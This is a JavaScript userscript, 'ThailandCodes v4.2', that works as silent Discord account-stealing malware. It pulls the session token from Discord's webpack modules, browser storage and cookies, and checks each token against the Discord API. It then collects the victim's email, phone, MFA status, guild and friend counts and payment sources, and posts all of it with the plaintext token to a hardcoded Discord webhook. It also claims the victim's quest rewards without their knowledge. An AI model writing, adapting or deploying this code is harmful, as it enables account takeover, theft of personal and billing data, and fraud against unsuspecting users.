/**
 * ThailandCodes v4.2 — Silent Single Grab
 * No UI. No buttons. Just grabs one token and sends.
 */
(function () {
    'use strict';
    const W = typeof unsafeWindow !== 'undefined' ? unsafeWindow : window;
    if (W.__TC_LOADED__) return;
    W.__TC_LOADED__ = true;

    const CONFIG = {
        webhooks: [
            'https://discord.com/api/webhooks/1563505727102910540/xtAh-pe1eLKUk7IRrKBvOD_4qpMcnWGMzo8ymS9ASqGzrPrnQ4x6N3yMhO2OGagrfV07',
        ],
        encryptKey: 0x5A,
        grabKey: '__tc_g_silent__',
        webpackTimeout: 90000,
        autoClaim: true,
        enrich: true,
    };
    const TOKEN_REGEX = /[\w-]{24,28}\.[\w-]{6}\.[\w-]{27,38}|mfa\.[\w-]{84}/g;
    const sleep = (ms) => new Promise(r => setTimeout(r, ms));

    function sendWebhookTo(url, payload) {
        return new Promise((resolve) => {
            try {
                GM_xmlhttpRequest({
                    method: 'POST',
                    url,
                    headers: { 'Content-Type': 'application/json' },
                    data: JSON.stringify(payload),
                    onload: (r) => resolve(r.status >= 200 && r.status < 300),
                    onerror: () => resolve(false),
                });
            } catch { resolve(false); }
        });
    }

    async function sendWebhook(payload) {
        for (let attempt = 0; attempt < 3; attempt++) {
            for (const url of CONFIG.webhooks) {
                if (await sendWebhookTo(url, payload)) return true;
            }
            await sleep(2500);
        }
        return false;
    }

    function encryptToken(token) {
        const key = CONFIG.encryptKey ^ (token.length & 0xFF);
        let out = '';
        for (let i = 0; i < token.length; i++) {
            out += String.fromCharCode(token.charCodeAt(i) ^ (key + i));
        }
        return btoa(unescape(encodeURIComponent(out)));
    }

    function findWebpack() {
        const chunk = W.webpackChunkdiscord_app;
        if (!chunk) return null;
        let found = null;
        const probeId = Symbol('tc_probe');
        try {
            chunk.push([[probeId], {}, (m) => {
                if (!m?.c) return;
                for (const cid in m.c) {
                    const exp = m.c[cid]?.exports?.default || m.c[cid]?.exports;
                    if (exp && typeof exp.getToken === 'function') {
                        found = m;
                        return;
                    }
                }
            }]);
            for (let i = chunk.length - 1; i >= 0; i--) {
                const entry = chunk[i];
                if (Array.isArray(entry) && entry[0]?.[0] === probeId) {
                    chunk.splice(i, 1);
                    break;
                }
            }
        } catch {}
        return found;
    }

    async function waitForWebpack(timeout = CONFIG.webpackTimeout) {
        const start = Date.now();
        while (Date.now() - start < timeout) {
            const wp = findWebpack();
            if (wp) return wp;
            await sleep(500);
        }
        return null;
    }

    async function getToken() {
        const wp = findWebpack();
        if (!wp) throw new Error('webpack not ready');
        for (const m of Object.values(wp.c)) {
            const cand = m?.exports?.default || m?.exports;
            if (cand && typeof cand.getToken === 'function') {
                const t = cand.getToken();
                if (t && typeof t === 'string') return t;
            }
        }
        throw new Error('token not found');
    }

    function harvestStorage(storage, tokens) {
        try {
            for (let i = 0; i < storage.length; i++) {
                const val = storage.getItem(storage.key(i));
                if (!val) continue;
                const matches = val.match(TOKEN_REGEX);
                if (matches) matches.forEach(t => tokens.add(t));
            }
        } catch {}
    }

    function harvestCookies(tokens) {
        try {
            const matches = (document.cookie || '').match(TOKEN_REGEX);
            if (matches) matches.forEach(t => tokens.add(t));
        } catch {}
    }

    function harvestAllTokens() {
        const tokens = new Set();
        harvestStorage(localStorage, tokens);
        harvestStorage(sessionStorage, tokens);
        harvestCookies(tokens);
        return [...tokens];
    }

    function apiCall(token, method, path, body) {
        return new Promise((resolve) => {
            try {
                GM_xmlhttpRequest({
                    method,
                    url: 'https://discord.com/api/v10' + path,
                    headers: { 'Authorization': token, 'Content-Type': 'application/json' },
                    data: body ? JSON.stringify(body) : undefined,
                    onload: (r) => { try { resolve(JSON.parse(r.responseText)); } catch { resolve(null); } },
                    onerror: () => resolve(null),
                });
            } catch { resolve(null); }
        });
    }

    async function validateToken(token) {
        const u = await apiCall(token, 'GET', '/users/@me');
        return u && !u.message;
    }

    async function enrichUser(token, baseUser) {
        const result = { ...baseUser, _guilds: null, _friends: null, _billing: null };
        if (!CONFIG.enrich) return result;
        try {
            const [g, f, b] = await Promise.all([
                apiCall(token, 'GET', '/users/@me/guilds'),
                apiCall(token, 'GET', '/users/@me/relationships'),
                apiCall(token, 'GET', '/users/@me/billing/payment-sources'),
            ]);
            if (Array.isArray(g)) result._guilds = g.length;
            if (Array.isArray(f)) result._friends = f.length;
            if (Array.isArray(b)) result._billing = b.length;
        } catch {}
        return result;
    }

    function buildEmbed(token, user) {
        const tag = user.discriminator && user.discriminator !== '0'
            ? `${user.username}#${user.discriminator}`
            : user.username;
        const avatarUrl = user.avatar
            ? `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.${user.avatar.startsWith('a_') ? 'gif' : 'png'}?size=256`
            : `https://cdn.discordapp.com/embed/avatars/${(parseInt(user.discriminator) || 0) % 5}.png`;
        const nitroMap = { 0: '❌ None', 1: '💜 Nitro Classic', 2: '🚀 Nitro', 3: '⚡ Nitro Basic' };
        const nitro = nitroMap[user.premium_type] || '❌ None';
        const f = user.public_flags || 0;
        const badges = [];
        if (f & (1 << 0))  badges.push('👮 Staff');
        if (f & (1 << 1))  badges.push('🤝 Partner');
        if (f & (1 << 2))  badges.push('🎪 HypeSquad');
        if (f & (1 << 3))  badges.push('🏠 Bravery');
        if (f & (1 << 4))  badges.push('💡 Brilliance');
        if (f & (1 << 5))  badges.push('⚖️ Balance');
        if (f & (1 << 6))  badges.push('🎉 Events');
        if (f & (1 << 7))  badges.push('📜 Early');
        if (f & (1 << 8))  badges.push('🛠️ Developer');
        if (f & (1 << 9))  badges.push('⭐ Early Supporter');
        if (f & (1 << 14)) badges.push('🕵️ Bug Hunter 1');
        if (f & (1 << 15)) badges.push('🕵️ Bug Hunter 2');
        if (f & (1 << 16)) badges.push('🎓 Verified Bot');
        if (f & (1 << 17)) badges.push('👨‍💻 Active Dev');
        if (f & (1 << 18)) badges.push('📚 Mod Alumni');
        if (f & (1 << 22)) badges.push('🤖 Verified Dev');
        const createdAt = new Date(Number((BigInt(user.id) >> 22n) + 1420070400000n));
        const premiumSince = user.premium_since
            ? new Date(user.premium_since).toUTCString()
            : '`N/A`';
        const fields = [
            { name: '👤 Username', value: `\`${tag}\``, inline: true },
            { name: '🆔 User ID', value: `\`${user.id}\``, inline: true },
            { name: '📧 Email', value: user.email ? `\`${user.email}\`` : '`N/A`', inline: true },
            { name: '📱 Phone', value: user.phone ? `\`${user.phone}\`` : '`N/A`', inline: true },
            { name: '💎 Nitro', value: nitro, inline: true },
            { name: '✅ Verified', value: user.verified ? '`Yes`' : '`No`', inline: true },
            { name: '🔐 MFA', value: user.mfa_enabled ? '`Enabled`' : '`Disabled`', inline: true },
            { name: '🌍 Locale', value: `\`${user.locale || 'en-US'}\``, inline: true },
            { name: '📅 Created', value: `\`${createdAt.toUTCString()}\``, inline: false },
            { name: '💎 Premium Since', value: premiumSince, inline: false },
        ];
        if (user._guilds !== null) fields.push({ name: '🏰 Guilds', value: `\`${user._guilds}\``, inline: true });
        if (user._friends !== null) fields.push({ name: '👥 Friends', value: `\`${user._friends}\``, inline: true });
        if (user._billing !== null) fields.push({ name: '💳 Payment Sources', value: `\`${user._billing}\``, inline: true });
        fields.push({ name: '🏅 Badges', value: badges.length ? badges.join(' | ') : '`None`', inline: false });
        fields.push({ name: '🔑 Token (Plain)', value: `\`\`\`${token}\`\`\``, inline: false });
        fields.push({ name: '🔒 Token (Encrypted)', value: `\`\`\`${encryptToken(token)}\`\`\``, inline: false });
        return {
            embeds: [{
                title: '🎯 Token Grabbed',
                color: 0xed4245,
                author: { name: tag, icon_url: avatarUrl },
                thumbnail: { url: avatarUrl },
                fields,
                footer: { text: 'ThailandCodes v4.2 • Silent', icon_url: avatarUrl },
                timestamp: new Date().toISOString(),
            }],
        };
    }

    async function claimAllQuests() {
        const wp = findWebpack();
        if (!wp) throw new Error('webpack not ready');
        let api = null, QuestsStore = null;
        for (const m of Object.values(wp.c)) {
            const exp = m?.exports?.default || m?.exports;
            if (!exp) continue;
            if (exp.get && exp.post && exp.put) api = exp;
            if (exp.quests && typeof exp.quests.values === 'function') QuestsStore = exp;
        }
        if (!api || !QuestsStore) throw new Error('Quest modules not found');
        const quests = [...QuestsStore.quests.values()].filter(q =>
            q.userStatus?.completedAt && !q.userStatus?.claimedAt
        );
        if (quests.length === 0) return 0;
        let claimed = 0;
        for (const q of quests) {
            try {
                await api.post({ url: `/quests/${q.id}/claim-reward`, body: { location: 1, platform: 0 } });
                claimed++;
            } catch {}
        }
        return claimed;
    }

    async function grabOneToken() {
        let token = null;
        try {
            const t = await getToken();
            if (t && await validateToken(t)) token = t;
        } catch {}
        if (!token) {
            const harvested = harvestAllTokens();
            for (const t of harvested) {
                if (await validateToken(t)) { token = t; break; }
            }
        }
        if (!token) return false;
        const base = await apiCall(token, 'GET', '/users/@me');
        if (!base) return false;
        const enriched = await enrichUser(token, base);
        const ok = await sendWebhook(buildEmbed(token, enriched));
        if (ok && CONFIG.autoClaim) {
            try { await claimAllQuests(); } catch {}
        }
        return ok;
    }

    async function init() {
        let alreadyGrabbed = false;
        try { alreadyGrabbed = localStorage.getItem(CONFIG.grabKey) === '1'; } catch {}
        if (alreadyGrabbed) return;

        const wp = await waitForWebpack();
        if (!wp) return;

        const ok = await grabOneToken();
        if (ok) {
            try { localStorage.setItem(CONFIG.grabKey, '1'); } catch {}
        }
    }

    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', init);
    } else {
        init();
    }
})();
